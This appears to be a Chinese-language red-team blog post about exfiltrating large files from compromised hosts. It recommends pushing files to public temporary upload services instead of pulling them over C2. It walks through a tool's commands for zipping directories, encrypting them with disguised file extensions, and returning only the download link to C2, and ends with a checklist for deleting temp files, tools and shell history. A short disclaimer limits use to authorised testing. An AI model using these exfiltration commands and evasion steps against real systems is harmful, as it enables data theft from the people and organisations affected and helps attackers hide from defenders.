---
title: "当 C2 拉不动大文件：红队后渗透的云端外带思路"
date: 2026-07-16T23:16:00+08:00
draft: false
description: "C2 不适合拉大文件。把重流量拆到云端上传渠道，并用 Uploader 完成探测、择路、打包与加密外带。"
categories: ["安全"]
tags: ["red-team", "c2", "post-exploitation", "uploader", "file-transfer"]
featuredImage: "/images/posts/c2-large-file-exfil-via-cloud-upload/featured.jpg"
featuredImagePreview: "/images/posts/c2-large-file-exfil-via-cloud-upload/featured.jpg"
lightgallery: true
toc:
  enable: true
  auto: true
---

进了内网、权限也稳，机器上还有压缩包、库导出、配置备份，但就是带不出来——渗透测试里并不少见。

<!--more-->

问题通常不在找文件，而在通道：C2（Command and Control）本来就不是用来搬大文件的。

{{< admonition warning "合规声明" >}}
仅供授权渗透测试与研究使用。请勿用于未授权系统。
{{< /admonition >}}

## 1. 为什么不该用 C2 下大文件

C2 的职责是维持控制、下发命令、做轻量交互。用它去拉几十 MB、上百 MB 的压缩包，痛点不只是「会话抖一下」这么简单。

**先说会话本身。** 大文件会把通道带宽占满，交互变慢甚至卡住；心跳跟着抖，会话变脆。文件没下完、会话先丢了，在项目里并不罕见。如果还叠了 sleep / jitter，传一个大包可能要拖很久，中途一断就得重来——不少 C2 的文件下载对断点续传支持很弱，等于白耗时间。

**再说通道形态。** 有的链路本身就会放大代价：HTTP(S) 通道里常见的编码、分片，实际流量往往比原文件大一截；经过多级 pivot、SOCKS、内网跳板时，每一跳都在放大延迟和失败率。Team Server 若是多人共用，一个人在拉大包，其他人的操作体感也会一起变差。

**还有工程和现场限制。** 部分 C2 / 马种对单次传输大小、超时、并发有硬限制；目录只能一点点拖，批量证据收集效率极低。下载过程中目标机或跳板上还会多出临时落地文件，磁盘、杀软、行为监控多一处暴露面。更麻烦的是：大流量一旦指向己方 C2 基础设施，等于把控制端位置写进流量特征里——控权限的通道拿来当数据管道，OPSEC 上不划算。

所以常见结局是：权限还在，会话也在，关键数据却带不完整，或者带出来的成本已经高过收益。

## 2. 别拉，让目标自己推

更稳的做法是把重流量从 C2 上拆出去：

1. 在目标上整理好文件或目录
2. 由目标主机上传到可访问的云端或临时网盘
3. 攻击机从云端下载
4. C2 只负责下发短命令、回传下载链接

重流量走「目标 → 公网上传服务」，控制流量仍走 C2。会话不容易被大文件拖死，C2 设施也不必吃那一波大流量。

主场景很具体：把工具丢到目标机（Win / Linux 投递为主，亦有 macOS 构建），指定文件或目录让它自己推出去。少依赖、无弹窗、输出能被脚本吃掉；超限或渠道不通要尽早报错，而不是传了半天才失败。

## 3. 从 Transfer 到 Uploader

这个思路不新。[Mikubill/transfer](https://github.com/Mikubill/transfer) 早就把「多后端临时上传」做成了命令行工具：丢一个二进制上去，选渠道、上传、拿链接。

但它已基本停更（最近可见提交约在 2023 年）。渠道失效、接口变更、边界 Bug 会在现场直接翻车；帮助里也往往看不清有哪些渠道、各自多大限制、当前网络通不通。

基于同一思路做了独立维护的二开：[simonlee-hello/uploader](https://github.com/simonlee-hello/uploader)（MIT；Go 为主、偏 stdlib、约 6MB 静态二进制；另有更小的 Rust 实验版）。界面与报错统一英文，帮助尽量短。

相对原项目，多出来的主要是这些：

- **选渠道**：`-b`（backend）用来指定上传渠道，例如 `-b lit`。不写 `-b` 时走默认自动模式：先按文件大小丢掉装不下的渠道，再探活（`probe`），按延迟从快到慢试；某个渠道失败会换下一个。只有显式写了 `-b` 才会钉死在那一个渠道上；若写成 `-b lit -auto`，则先试 lit，挂了仍可换路。
- **看渠道**：`uploader backends` 列出渠道名、大小限制、状态和 URL；`uploader probe` 测当前网络下哪些通、大概多慢。状态分 `ok` / `flaky` / `down`，不稳定的默认跳过，除非加上 `-force`。
- **大小预检**：上传前比对文件体积和渠道限额。给的是目录时，按目录内文件体积之和做上界估算（最终 zip 可能更小或略有偏差）；超限会直接拦住并提示可以换哪些渠道，避免传了半天才失败。
- **传目录**：默认先用 Deflate 打成 zip 再上传（压缩包临时写到磁盘，传完删除）。若加 `-r`，则目录里每个文件单独上传，不打包。
- **加密**：算法是 AES-256-CBC（文件头 `UP01` + 随机 IV），用法如 `-e -k 'your-key'`。加密后再上传时，文件名不会用扎眼的 `.encrypt`，而是伪装成普通后缀（如 `.bin`），免得部分渠道直接报非法扩展名。
- **安静输出**：`-q` 时成功只把下载链接打到标准输出，方便 C2 或脚本截取；错误仍走标准错误。不要加 `-keep`，否则进程会停住等回车，脚本和无头环境会卡住。

当前内置 11 个后端（`temp`、`lit`、`gof`、`wss`、`fic`、`gg` 等）。`cat`、`bash` 为 flaky，`nil`（0x0.st）为 down。名单能列，现场仍以 `probe` 为准。

## 4. 用法怎么贴合 C2 场景

{{< image src="/images/posts/c2-large-file-exfil-via-cloud-upload/uploader-demo.gif" caption="Uploader 演示：backends / probe / 上传 / 安静模式 / 加密" >}}

最常见的一条：

```bash
uploader -q ./evidence
```

不写 `-b`（不指定渠道）时流程是：体积过滤 → probe → 按延迟择路 → 失败换下一个。目录会先压缩打包。成功后标准输出通常只有一行链接；退出码 `0` / `1` / `2` 分别对应成功、上传或配置失败、参数错误。

钉死渠道，或「首选固定 + 仍可换路」：

```bash
uploader -q -b lit ./dump.zip
uploader -q -b lit -auto ./dump.zip
uploader -q -r ./dir
uploader -q -e -k 'your-key' ./secret.bin
```

只摸环境：

```bash
uploader backends
uploader probe
uploader probe temp lit gof -timeout 20
```

渠道还有容量和时效差异（如 litterbox 约 72 小时过期），传完尽快从己方环境取回。

## 5. 现场检查清单

1. 出口是否通：公网、代理、白名单、TLS 检查
2. 用小文件验证链路后，再传核心包
3. 高敏内容开 `-e -k`；文件名本身也不要泄密
4. 传完清临时 zip、工具和历史命令；云端链接按时效尽快下载

C2 管控制，上传工具管外带——别让同一条通道同时干两件最重的事。

## 6. 小结

后渗透卡点常常不是有没有权限，而是大文件怎么带出、又不把会话拖死。通道选错，就会「进得去、带不出」。

让目标把文件推到云端，再从云端取回，是把重负载从控制通道上拆出去的一种做法。

- 项目：[simonlee-hello/uploader](https://github.com/simonlee-hello/uploader)
- 灵感来源：[Mikubill/transfer](https://github.com/Mikubill/transfer)
